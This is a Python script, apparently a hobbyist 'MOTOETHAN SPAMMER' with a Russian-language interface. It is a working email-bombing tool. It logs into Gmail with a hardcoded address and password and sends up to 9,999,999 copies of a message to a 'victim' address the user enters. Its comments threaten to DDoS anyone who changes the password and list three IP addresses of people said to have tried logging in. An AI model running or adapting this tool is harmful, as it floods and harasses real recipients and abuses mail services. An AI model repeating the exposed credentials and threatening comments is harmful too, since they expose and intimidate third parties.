import smtplib
import sys

#DONT CHANGE THE PASSWORD, I`L BECAME YOUR IP AND DDOS YOU
email_provider = 'smtp.gmail.com' 
email_address = "motoethanthespammer@gmail.com" 
email_port = 587 
#PASSWORD = 31.173.101.25  213.21.9.27 195.206.183.124   NO, IT ISN PASSWORD, THESE ARE IPS OF ALL BITCHES TRYED TO LOGIN
password = "Alex2018" #DONT CHANGE THE PASSWORD, I`L BECAME YOUR IP AND DDOS YOU LIKE THESE: 31.173.101.25  213.21.9.27 195.206.183.124
msg = "\nSPAM" 
spam0 = 9999999 
spam50 = 50
spam100 = 100
spam1000 = 1000

#Func for sending
def sending():
    #Logo
    print(" __      __     __   __                             ")
    print("|   \  /   |   |  \ |  |                    ")
    print("|    \/    |   |   \|  |                      ")
    print("|  |\  /|  |   |       |  BY               ")
    print("|  | \/ |  |   |  |\   |  https://vk.com/alex_fominskiy                   ")
    print("|__|    |__|   |__| \__|  v.0.1                                       ")
    print(">>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<<                        ")
    print("\nПожалуйста, выберите количество писем, которое вы хотите отправить: \n[20]  [50]  [100]  [1000]")
    print("Рекомендовано не больше 50")
    amount = input("Твой выбор: ")
    print(msg)
    print("Вот сообщение, которое увидет ваша жертва")
    print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<                        ")
    if amount == "0":
        server = smtplib.SMTP(email_provider, email_port)
        server.starttls()
        server.login(email_address, password)
        for _ in range(0,spam0):
            server.sendmail(email_address,target_email,msg)
            print("Отправлено {}".format(_))
        print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<                        ")
        print("\n{} Сообщений успешно отправлены".format(spam0))
        server.quit()
        sys.exit()

    elif amount == "50":
        server = smtplib.SMTP(email_provider, email_port)
        server.starttls()
        server.login(email_address, password)
        for _ in range(0,spam50):
            server.sendmail(email_address,target_email,msg)
            print("Отправлено {}".format(_))
        print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<                        ")
        print("\n{} Сообщений успешно отправлены".format(spam50))
        server.quit()
        sys.exit()

    elif amount == "100":
        server = smtplib.SMTP(email_provider, email_port)
        server.starttls()
        server.login(email_address, password)
        for _ in range(0,spam100):
            server.sendmail(email_address,target_email,msg)
            print("Отправлено {}".format(_))
        print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<                        ")
        print("\n{} Сообщений успешно отправлены".format(spam100))
        server.quit()
        sys.exit()

    elif amount == "1000":
        server = smtplib.SMTP(email_provider, email_port)
        server.starttls()
        server.login(email_address, password)
        for _ in range(0,spam1000):
            server.sendmail(email_address,target_email,msg)
            print("Отправлено {}".format(_))
        print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<                        ")
        print("\n{} Сообщений успешно отправлены".format(spam1000))
        server.quit()
        sys.exit()

    else:
        print("error")
        sys.exit()


    print(" __      __     __   __                             ")
    print("|   \  /   |   |  \ |  |                    ")
    print("|    \/    |   |   \|  |                      ")
    print("|  |\  /|  |   |       |  BY               ")
    print("|  | \/ |  |   |  |\   |  https://vk.com/alex_fominskiy                   ")
    print("|__|    |__|   |__| \__|  v.0.1                                       ")
    print(">>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<<                        ")
print("ПРЕДУПРЕЖДЕНИЕ! ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНОЙ ЦЕЛИ! РАЗРАБОТЧИК НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ!")
print("ЗАПУСКАЕТЕ НА СВОЙ СТРАХ И РИСК!")
print(">>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<                        ")
target_email = input("Введите email жертвы: ")
print(msg)
print("\nВот сообщение, которое увидет ваша жертва")
s = input("Ты хочешь изменить сообщение на своё? y - Да/n - Нет: ")
if s == "y":
    msg = input("Введите ваше сообщение (На английском языке), затем нажмите ENTER: ")
    while True:
        if msg.__contains__("ENTER"):
            msg += ("\n")
            msg = msg.replace("ENTER", "")
            print (msg)
            msg += input("\nNext line of the message: ")
        else:
            print(msg)
            sure = input("\nЭто сообщение, которое вы хотите отправить? y - Да/n -Нет: ")
            if sure == "y":
                sending()
            else:
                print("\n>>>>>>>>>>>>>>MOTOETHAN SPAMMER<<<<<<<<<<<<<<<<<                        ")
                print("Error")
                sys.exit()
else:
    sending()

                

